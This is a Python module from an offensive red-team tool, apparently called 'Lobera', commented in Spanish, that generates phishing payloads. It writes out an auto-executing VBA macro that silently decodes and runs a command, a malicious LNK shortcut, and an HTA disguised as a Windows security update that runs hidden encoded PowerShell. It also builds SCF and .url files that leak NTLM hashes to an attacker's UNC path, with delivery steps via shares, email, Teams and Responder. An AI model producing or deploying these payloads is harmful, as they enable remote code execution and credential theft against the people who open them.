# scripts/smb/attack/phishing.py
"""
Generador de payloads de phishing para post-explotación y red team.

Tipos disponibles:
  - macro    — documento Office con macro VBA (Word/Excel)
  - lnk      — acceso directo .lnk con comando embebido
  - hta      — aplicación HTML (.hta) con VBScript/PowerShell
  - scf      — archivo SCF para captura de hash NTLM vía UNC
  - url      — archivo .url (Internet Shortcut) con icono UNC

Todos los payloads se generan en local — no requieren objetivo conectado.

Uso:
  python lobera.py smb --script=phishing --type macro --exec "powershell -c IEX(...)" --out-dir /tmp/payloads
  python lobera.py smb --script=phishing --type lnk   --exec "C:\\Windows\\Temp\\shell.exe" --out-dir /tmp/payloads
  python lobera.py smb --script=phishing --type hta   --exec "powershell -w h -c IEX(...)" --out-dir /tmp/payloads
  python lobera.py smb --script=phishing --type scf   --attacker-ip 10.10.10.99 --out-dir /tmp/payloads
  python lobera.py smb --script=phishing --type url   --attacker-ip 10.10.10.99 --out-dir /tmp/payloads
"""

from core.output import console
from core import session_db

import os
import base64


# ── Macro VBA (Word/Excel) ────────────────────────────────────────────────────

def _macro_vba(payload, out_dir, doc_name):
    """Genera un módulo VBA listo para pegar en Word/Excel."""
    console.print(f"  [bold]Tipo:[/bold] Macro VBA (Word/Excel)")

    # Codificar payload en base64 para evitar caracteres conflictivos en VBA
    b64 = base64.b64encode(payload.encode("utf-16-le")).decode()

    vba = f'''\' Módulo VBA — pegar en el editor de macros (Alt+F11)
\' Herramienta: Lobera | Autor: mitr0kerb

Private Sub AutoOpen()
    ExecutePayload
End Sub

Private Sub Document_Open()
    ExecutePayload
End Sub

Private Sub Workbook_Open()
    ExecutePayload
End Sub

Sub ExecutePayload()
    Dim sCmd As String
    Dim oShell As Object
    Dim b64 As String

    b64 = "{b64}"

    \' Decodificar y ejecutar
    Dim aBytes() As Byte
    aBytes = Base64Decode(b64)
    sCmd  = CreateObject("System.Text.Encoding").GetEncoding(1200).GetString(aBytes)

    Set oShell = CreateObject("WScript.Shell")
    oShell.Run sCmd, 0, False
    Set oShell = Nothing
End Sub

Function Base64Decode(s As String) As Byte()
    Dim oXML As Object
    Dim oNode As Object
    Set oXML  = CreateObject("MSXML2.DOMDocument")
    Set oNode = oXML.createElement("b64")
    oNode.DataType = "bin.base64"
    oNode.Text = s
    Base64Decode = oNode.nodeTypedValue
    Set oNode = Nothing
    Set oXML  = Nothing
End Function
'''

    out_path = os.path.join(out_dir, f"{doc_name}.bas")
    with open(out_path, "w", encoding="utf-8") as f:
        f.write(vba)

    console.print(f"  [green]✓ Módulo VBA guardado: {out_path}[/green]")
    console.print(f"  [dim]Instrucciones:[/dim]")
    console.print(f"  [dim]  1. Abre Word/Excel → Alt+F11 → Insertar módulo[/dim]")
    console.print(f"  [dim]  2. Pega el contenido de {doc_name}.bas[/dim]")
    console.print(f"  [dim]  3. Guarda como .docm / .xlsm (con macros habilitadas)[/dim]")
    return out_path


# ── LNK ───────────────────────────────────────────────────────────────────────

def _lnk(payload, out_dir, doc_name):
    """Genera un acceso directo .lnk malicioso."""
    console.print(f"  [bold]Tipo:[/bold] Acceso directo LNK")

    # PowerShell one-liner que crea el LNK en el objetivo al ejecutarse
    # Aquí generamos un script PS que el pentester puede ejecutar en local
    # para crear el .lnk real
    ps_create = f"""
# Ejecutar en PowerShell local para crear el LNK
$shell     = New-Object -ComObject WScript.Shell
$shortcut  = $shell.CreateShortcut("{doc_name}.lnk")
$shortcut.TargetPath       = "C:\\Windows\\System32\\cmd.exe"
$shortcut.Arguments        = "/c {payload}"
$shortcut.WorkingDirectory = "C:\\Windows\\System32"
$shortcut.IconLocation     = "C:\\Windows\\System32\\shell32.dll,70"
$shortcut.Description      = "Acceso rápido"
$shortcut.WindowStyle      = 7   # Minimizado
$shortcut.Save()
Write-Host "[+] LNK creado: $PWD\\{doc_name}.lnk"
"""

    out_path = os.path.join(out_dir, f"{doc_name}_create_lnk.ps1")
    with open(out_path, "w", encoding="utf-8") as f:
        f.write(ps_create.strip())

    console.print(f"  [green]✓ Script de creación de LNK guardado: {out_path}[/green]")
    console.print(f"  [dim]Ejecuta en PowerShell: .\\{doc_name}_create_lnk.ps1[/dim]")
    console.print(f"  [dim]Envía el {doc_name}.lnk resultante al objetivo[/dim]")
    return out_path


# ── HTA ───────────────────────────────────────────────────────────────────────

def _hta(payload, out_dir, doc_name):
    """Genera un archivo HTML Application (.hta) con PowerShell embebido."""
    console.print(f"  [bold]Tipo:[/bold] HTML Application (.hta)")

    b64 = base64.b64encode(payload.encode("utf-16-le")).decode()

    hta_content = f"""<html>
<head>
<title>Actualizacion de seguridad</title>
<HTA:APPLICATION
  ID="htaApp"
  APPLICATIONNAME="WUpdate"
  WINDOWSTATE="minimize"
  SHOWINTASKBAR="no"
  SYSMENU="no"
  CAPTION="no"
  BORDER="none"
/>
<script language="VBScript">
Sub Window_OnLoad
    Dim oShell
    Set oShell = CreateObject("WScript.Shell")
    oShell.Run "powershell.exe -NonInteractive -WindowStyle Hidden -EncodedCommand {b64}", 0, False
    Set oShell = Nothing
    window.close
End Sub
</script>
</head>
<body>
<p>Comprobando actualizaciones...</p>
</body>
</html>"""

    out_path = os.path.join(out_dir, f"{doc_name}.hta")
    with open(out_path, "w", encoding="utf-8") as f:
        f.write(hta_content)

    console.print(f"  [green]✓ HTA guardado: {out_path}[/green]")
    console.print(f"  [dim]Sirve con: python3 -m http.server 80[/dim]")
    console.print(f"  [dim]Entrega: mshta.exe http://<atacante>/{doc_name}.hta[/dim]")
    return out_path


# ── SCF (captura de hash NTLM) ────────────────────────────────────────────────

def _scf(attacker_ip, out_dir, doc_name):
    """
    Genera un archivo SCF que fuerza autenticación NTLM al abrir la carpeta.
    Útil para colocar en shares SMB y capturar hashes con Responder.
    """
    console.print(f"  [bold]Tipo:[/bold] SCF (captura hash NTLM vía icono)")

    # El nombre @nombre.scf hace que aparezca arriba de la lista
    scf_name = f"@{doc_name}.scf"
    scf_content = f"""[Shell]
Command=2
IconFile=\\\\{attacker_ip}\\share\\icon.ico

[Taskbar]
Command=ToggleDesktop
"""

    out_path = os.path.join(out_dir, scf_name)
    with open(out_path, "w", encoding="utf-8") as f:
        f.write(scf_content)

    console.print(f"  [green]✓ SCF guardado: {out_path}[/green]")
    console.print(f"  [dim]Sube {scf_name} a un share SMB accesible por el objetivo[/dim]")
    console.print(f"  [dim]Arranca Responder: responder -I eth0 -wv[/dim]")
    console.print(f"  [dim]Al abrir la carpeta el objetivo enviará su hash NTLMv2[/dim]")
    return out_path


# ── URL (Internet Shortcut con icono UNC) ─────────────────────────────────────

def _url_file(attacker_ip, out_dir, doc_name):
    """
    Genera un .url con icono apuntando a UNC del atacante.
    Al previsualizar el icono, Windows autentica contra el atacante.
    """
    console.print(f"  [bold]Tipo:[/bold] Internet Shortcut .url (captura NTLM)")

    url_content = f"""[InternetShortcut]
URL=https://www.microsoft.com
IconFile=\\\\{attacker_ip}\\share\\icon.ico
IconIndex=1
HotKey=0
IDList=
"""

    out_path = os.path.join(out_dir, f"{doc_name}.url")
    with open(out_path, "w", encoding="utf-8") as f:
        f.write(url_content)

    console.print(f"  [green]✓ URL file guardado: {out_path}[/green]")
    console.print(f"  [dim]Sube a un share o envía por correo/Teams[/dim]")
    console.print(f"  [dim]Arranca Responder para capturar el hash NTLMv2[/dim]")
    return out_path


# ── Script principal ───────────────────────────────────────────────────────────

class Script:
    NAME        = "phishing"
    DESCRIPTION = "Generador de payloads phishing: macro VBA, LNK, HTA, SCF, URL"

    def __init__(self, target, creds):
        self.target = target
        self.creds  = creds

    def run(self, args):
        ptype       = getattr(args, "phishing_type", None) or getattr(args, "type", None) or "macro"
        payload     = getattr(args, "exec",          None)
        out_dir     = getattr(args, "out_dir",       ".") or "."
        doc_name    = getattr(args, "persist_name",  "documento") or "documento"
        attacker_ip = getattr(args, "attacker_ip",   None)

        os.makedirs(out_dir, exist_ok=True)

        console.print(f"  [bold]Phishing[/bold] → tipo: {ptype}  salida: {out_dir}")

        out_path = None

        if ptype == "macro":
            if not payload:
                console.print("[red]Falta --exec PAYLOAD[/red]"); return
            out_path = _macro_vba(payload, out_dir, doc_name)

        elif ptype == "lnk":
            if not payload:
                console.print("[red]Falta --exec PAYLOAD[/red]"); return
            out_path = _lnk(payload, out_dir, doc_name)

        elif ptype == "hta":
            if not payload:
                console.print("[red]Falta --exec PAYLOAD[/red]"); return
            out_path = _hta(payload, out_dir, doc_name)

        elif ptype == "scf":
            if not attacker_ip:
                console.print("[red]Falta --attacker-ip <IP>[/red]"); return
            out_path = _scf(attacker_ip, out_dir, doc_name)

        elif ptype == "url":
            if not attacker_ip:
                console.print("[red]Falta --attacker-ip <IP>[/red]"); return
            out_path = _url_file(attacker_ip, out_dir, doc_name)

        else:
            console.print(f"  [yellow]Tipos disponibles:[/yellow] macro | lnk | hta | scf | url")
            return

        if out_path:
            session_db.save_finding(
                category="phishing",
                data={
                    "type":    ptype,
                    "payload": payload or attacker_ip,
                    "file":    out_path,
                }
            )
            console.print(f"\n  [bold green]✓ Payload generado[/bold green]")
